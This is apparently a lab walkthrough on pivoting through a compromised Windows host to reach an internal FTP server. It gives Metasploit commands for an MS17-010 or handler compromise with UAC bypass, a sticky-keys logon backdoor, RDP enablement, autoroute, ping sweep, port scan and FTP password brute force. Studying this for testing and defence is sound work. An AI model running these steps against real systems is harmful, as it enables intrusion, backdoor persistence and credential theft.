# FTP Pivoting through RDP

**Lab Setup requirement:**

**Attacker machine**: Kali Linux

**Pivot Machine**:  window operating system with **two** network interface

**Target Machine**: window 7 \(Allow FTP service\)

![](https://i2.wp.com/2.bp.blogspot.com/-mz_nS2XwzLI/Wc52FvT8qXI/AAAAAAAARtE/35FVXDn3UkcN8bVAxw3ibsJS4yDPiYUAwCLcBGAs/s1600/1.png?w=687&ssl=1)

#### **Exploit pivot machine**

Use exploit MS17-010 or multi handler to hack the pivot machine and bypass its UAC to achieve admin privileges.sessions

| 1 | sessions |
| :--- | :--- |


 ****From the given image you can confirm that I owned a pivot machine \(192.168.0.101\) meterpreter sessions 1.

![](https://i0.wp.com/4.bp.blogspot.com/-uQovMrYXS-U/Wc52GpTa1FI/AAAAAAAARtY/EcQnEioc-eIkAccloIZSj6kYVHqYYIBTgCLcBGAs/s1600/2.png?w=687&ssl=1)

#### **Launch the sticky key attack** 

Here I need to make post exploits to launch the sticky key attack use post/windows/manage/sticky\_keys  
msf post\(sticky\_keys\) &gt; set session 1  
msf post\(sticky\_keys\) &gt;exploit

| 123 | use post/windows/manage/sticky\_keysmsf post\(sticky\_keys\) &gt; set session 1msf post\(sticky\_keys\) &gt;exploit |
| :--- | :--- |


**Great!!** It has successfully launched a sticky attack in pivot machine and now we will utilize it later for establishing a connection with the target FTP server.

![](https://i1.wp.com/4.bp.blogspot.com/-ZFZF7a4wH2s/Wc52HHi4aJI/AAAAAAAARtc/cszQh_3xafkRI_OwSUjUSa9XXTqSAitfACLcBGAs/s1600/3.png?w=687&ssl=1)

#### **Enable RDP service**

Open meterpreter session1 and type following command which will enable remote Desktop service in the pivoted machine. meterpreter&gt; run getgui -e

| 1 | meterpreter&gt; run getgui -e |
| :--- | :--- |


![](https://i2.wp.com/1.bp.blogspot.com/-kSXnek5qSYA/Wc52HeO56AI/AAAAAAAARtg/EFKxLz_oAHYffIo6pshqLV06N-RkDHFTQCLcBGAs/s1600/4.png?w=687&ssl=1)

#### **Verify the network interface of the pivot**

Check the network interface through the following command:meterpreter&gt; ifconfig

| 1 | meterpreter&gt; ifconfig |
| :--- | :--- |


From the given image you can observe two networks interface in pivot’s system **1st** for IP **192.168.0.101** through which the attacker is connected and **2nd** for IP **192.168.100.102** through which FTP server \(targets\) are connected.

![](https://i1.wp.com/2.bp.blogspot.com/-C9AuZRJVl3E/Wc52HjUwohI/AAAAAAAARtk/-Clvo-P-fAwrVbgOUBTrPpQ47VSI12v-wCLcBGAs/s1600/5.png?w=687&ssl=1)

#### Autoroute

Since the attacker belongs to **192.168.0.1** interface and client belongs to **192.168.100.0** interface, therefore, it is not possible to directly make an attack on client network until unless the attacker acquires the same network connection. In order to achieve 192.168.100.0 network attacker need to run the **post exploitation** “autoroute”.

This module manages session routing via an existing Meterpreter session. It enables other modules to ‘pivot’ through a compromised host when connecting to the named NETWORK and SUBMASK. Autoadd will search a session for valid subnets from the routing table and interface list then add routes to them. The default will add a default route so that all TCP/IP traffic not specified in the MSF routing table will be routed through the session when pivoting.use post/multi/manage/autoroute   
msf post\(autoroute\) &gt; set session 1  
msf post\(autoroute\) &gt; exploit

| 123 | use post/multi/manage/autoroute msf post\(autoroute\) &gt; set session 1msf post\(autoroute\) &gt; exploit |
| :--- | :--- |


![](https://i0.wp.com/4.bp.blogspot.com/-Rs-w8xKhNoY/Wc52H-CnBJI/AAAAAAAARts/9mZZ-eZL3zgRhIM1JUV6GnSIslzxN826gCLcBGAs/s1600/6.png?w=687&ssl=1)

#### Ping Sweep

This module will perform IPv4 ping sweep using the OS included ping command.use post/windows/gather/ping\_sweep  
msf post\(ping\_sweep\) &gt; set rhosts 192.168.100.1-110  
msf post\(ping\_sweep\) &gt; set session 1  
msf post\(ping\_sweep\) &gt; exploit

| 1234 | use post/windows/gather/ping\_sweepmsf post\(ping\_sweep\) &gt; set rhosts 192.168.100.1-110msf post\(ping\_sweep\) &gt; set session 1msf post\(ping\_sweep\) &gt; exploit |
| :--- | :--- |


 ****Here we found a new host IP **192.168.100.103** as shown in the given image. Let’s perform TCP port scan for activated services on this machine.

![](https://i2.wp.com/1.bp.blogspot.com/-frLRtllpfrM/Wc52H5DnN_I/AAAAAAAARto/avqQlY8Yuco_asSLo1lMaRQjHJGrWHThACLcBGAs/s1600/7.png?w=687&ssl=1)

#### **Use TCP Port Scan**

This module Enumerates open TCP services by performing a full TCP connect on each port. This does not need administrative privileges on the source machine, which may be useful if pivoting.use auxiliary/scanner/portscan/tcp  
msf auxiliary\(tcp\) &gt; set ports 21  
msf auxiliary\(tcp\) &gt; set rhosts 192.168.100.103  
msf auxiliary\(tcp\) &gt; set thread 10  
msf auxiliary\(tcp\) &gt;exploit

| 12345 | use auxiliary/scanner/portscan/tcpmsf auxiliary\(tcp\) &gt; set ports 21msf auxiliary\(tcp\) &gt; set rhosts 192.168.100.103msf auxiliary\(tcp\) &gt; set thread 10msf auxiliary\(tcp\) &gt;exploit |
| :--- | :--- |


From given you can observe **port 21** is **open** and we know that 21 used for FTP services.

![](https://i0.wp.com/4.bp.blogspot.com/-tpVrVsX9RFw/Wc52IWXoJxI/AAAAAAAARtw/M3pF4JO-W80K_ohdQ3zJZ-Qrp9Dqoj1RQCLcBGAs/s1600/8.png?w=687&ssl=1)

#### **FTP Login Brute Force**

This module will test FTP logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.use auxiliary/scanner/ftp/ftp\_login  
msf auxiliary\(ftp\_login\) &gt; set rhosts 192.168.100.103  
msf auxiliary\(ftp\_login\) &gt; set user\_file /root/Desktop/user.txt  
msf auxiliary\(ftp\_login\) &gt; set pass\_file /root/Desktop/pass.txt  
msf auxiliary\(ftp\_login\) &gt; set stop\_on\_success true  
msf auxiliary\(ftp\_login\) &gt; exploit

| 123456 | use auxiliary/scanner/ftp/ftp\_loginmsf auxiliary\(ftp\_login\) &gt; set rhosts 192.168.100.103msf auxiliary\(ftp\_login\) &gt; set user\_file /root/Desktop/user.txtmsf auxiliary\(ftp\_login\) &gt; set pass\_file /root/Desktop/pass.txtmsf auxiliary\(ftp\_login\) &gt; set stop\_on\_success truemsf auxiliary\(ftp\_login\) &gt; exploit |
| :--- | :--- |


From the given image you can observe it is showing the matching combination of **username: raj** and **password: 123** for login.

![](https://i0.wp.com/3.bp.blogspot.com/-iB1lXtvHIsY/Wc52IluSqWI/AAAAAAAARt0/Bzquh9OnNEAim7JycGWm5296AH9lIgApQCLcBGAs/s1600/9.png?w=687&ssl=1)

#### **Connect to pivot through RDP**

Open a new terminal in Kali Linux and type the following command to connect with pivot machine through RDP servicerdesktop 192.168.0.101

| 1 | rdesktop 192.168.0.101 |
| :--- | :--- |


![](https://i1.wp.com/3.bp.blogspot.com/-54amtrRbI6I/Wc52FgJSNfI/AAAAAAAARtM/w_sytqzqKLg-XKzt4HC052cQ1asWvV_FACLcBGAs/s1600/10.png?w=687&ssl=1)

If you remember we had launched sticky attack above which will open a command prompt on logon screen when you will hit 5 times shift key.

Now **press 5 times to shift** key then you will get command prompt and type “**start iexplore.exe**” which will lunch Internet Explore.

![](https://i2.wp.com/1.bp.blogspot.com/-kOlPifhOvog/Wc52Fg9XijI/AAAAAAAARtI/xp_hzgq0Jqs7vdaka50u8t508xZ0dcPwACLcBGAs/s1600/11.png?w=687&ssl=1)

#### **Connect with FTP server**

Execute the following URL in the browser for FTP connection:

[**ftp://192.168.100.103**](ftp://192.168.100.103)

 Now enter the credential which we had found through FTP login brute force attack i.e. **raj: 123**

![](https://i1.wp.com/4.bp.blogspot.com/-pO8HWcVKmkk/Wc52GQgdh5I/AAAAAAAARtQ/fSmscP0oetsw1t-8sp2Rdg8eFcS4TK1MQCLcBGAs/s1600/12.png?w=687&ssl=1)

**Congrats!!!**  We are successfully connected with FTP server through pivot machine.

![](https://i2.wp.com/4.bp.blogspot.com/-7gC2J_BJRRo/Wc52GbgzKDI/AAAAAAAARtU/cQm623C6liQIq-9n9fqTHx02vmuU05EXQCLcBGAs/s1600/13.png?w=687&ssl=1)

